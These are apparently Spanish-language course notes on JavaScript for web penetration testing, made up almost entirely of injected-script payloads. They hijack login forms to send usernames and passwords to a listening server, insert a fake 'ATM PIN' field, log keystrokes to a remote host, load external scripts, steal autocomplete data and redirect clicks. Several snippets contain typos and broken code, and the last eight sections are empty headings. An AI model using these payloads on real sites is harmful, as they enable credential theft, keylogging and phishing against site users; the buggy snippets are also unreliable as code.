#### CallBack
> Recibir como parámetro a una función  
> Es una forma de asegurarnos de q un determinando codigo no se ejecuta hasta que otro codigo haya terminado de ejecutarse

### 1. Modificar HTML
**getElementsByTagName()** acepta un nombre de etiqueta y devuelve una colección HTML en vivo de elementos con el nombre de etiqueta coincidente en el orden en que aparecen en el documento.

```
document.getElementsByTagName("button")[0].innerHTML="JAVASCRIPT";
document.getElementsByTagName("h1")[0].innerHTML="Found";
```

### 2. Modificar los links
```
var links = document.getElementsByTagName("a");
for  (i=0; i<links.length; i++){
  links[i].href = "http://debiantano.github.io";
  links[i].innerHTML = "Link Modificado";
}
```

### 3. Hijack form submit
> Número de elementos \<form\> en el documento:  
```let num = document.forms.length;```  
> Obtenga la identificación del primer elemento \<form\>:  
```let id = document.forms[0].id;```  

```
function InterceptForm(){
  var username = document.forms[0].elements[0].value;
  var username = document.forms[0].elements[1].value;
  alert(username + ' : ' + password);
}
document.forms[0].onsubmit = InterceptForm;
```

```
> python -m SimpleHTTPServer 8000
function InterceptForm(){
  var username = document.forms[0].elements[0].value;
  var username = document.forms[0].elements[1].value;
  new Image().src = "http://localhost:8000/?username=' + username + "&password=" + password;
}
document.forms[0].onsubmit = InterceptForm;
```

### 4. Modify form fields
```
var input = document.createElement("input");

input.setAttribute("type", "text");
input.setAttribute("class", "input-block-level");
input.setAttribute("placeholder", "ATM PIN");
input.setAttribute("name", "atmpin");

var provius = document.forms[0].elements[0];

document.forms[0].insertBefore(input, previous);
docuemnt.forms[0].action = "http://localhost:8000/"
```

### 5. Ingenieria social
```
var input = document.createElement("h2");
input.innerHTML = "Sitio web subido. Por favor visita pentesteracademy.com";
document.forms[0].parentNode.appendChild(input)
```

```
var input = document.createElement("h2");
input.innerHTML = "Sitio web subido. Por favor visita pentesteracademy.com";
document.forms[0].parentNode.appendChild(input)
document.forms[0].parentNode.appendChild(document.forms[0)
```

### 6. Capture all clicks
```
function CaughtClick(){
  alert("You clicked");
}
document.body.addEventListener('click', CaughtClick, true);
```

```
function CaughtClick(){
  location.href = "https://google.es";
}
document.body.addEventListener('click', CaughtClick, true);
```

### 7. Keystroke logging
```
> python -m SimpleHTTPServer 8000
document.onkeypress = function Keylogger(inp){
  key_pressed = String.fromCharCode(inp.which);
  new Image().src = "http://localhost:9000/?" + key_pressed;
}
```

### 8. Event listener
```
" anmouseover="alert(1);

document.forms[0].onsubmit = function demo(){
  var pass = document.forms[0].elements[1].value;
  alert(pass);
}
```

### 9. Include external
```
> python -m http.server 8000
window.addEventListener("load", function(){alert(document.cookie);});  

<script src="http://localhost:8000/test.js"></script>
```
  
### 10. Include external js using
```
new newTag = document.createElement("script");
newTag.type = "text/javascript";
newTag.src = "http://demofilespa.s3amazonaws.com/jfptest.js";
document.body.appendChild(newTag);
```

### 11. Solution replace banner
```
document.getElementByTagName("img")[0].src = "https://www.google.com/images/srpr/logollw.png";
```

### 12. Solution Stealing from autocomplete
```
> nc -lvnp 8000
-----------------------------------------------------
window.setTimeout(function(){
  document.forms[0].action = "http://localhost:8000";
  document.forms[0].submit();
}, 10000);
```

### 13. Posting with xmlHTTPrequest
```
username = document.forms[0].elements[0].value;
password = document.forms[0].elements[1].value;
window.setTimeout(function(){
  alert(username + ":" + password)
}, 10000);
```

```
username = document.forms[0].elements[0].value;
password = document.forms[0].elements[1].value;
window.setTimeout(function(){
  var req = new XMLHttpRequest();
  req.open("GET", "http://localhost:8000/?username=" + username + "&password=" + password, true);
  req.send();
}, 10000);
```

### 14. Fetching data with xmlHTTPrequest
### 15. Data exfiltration with xmlHTTPrequest
### 16. Extraching CSRF tokens
### 17. CSRF token stealing
### 18. HTML parsing of xmlHTTPrequest response
### 19. Solution multilevel html parsing
### 20. Solution multilevel js parsing
### 21. Solution multilevel xml parsing

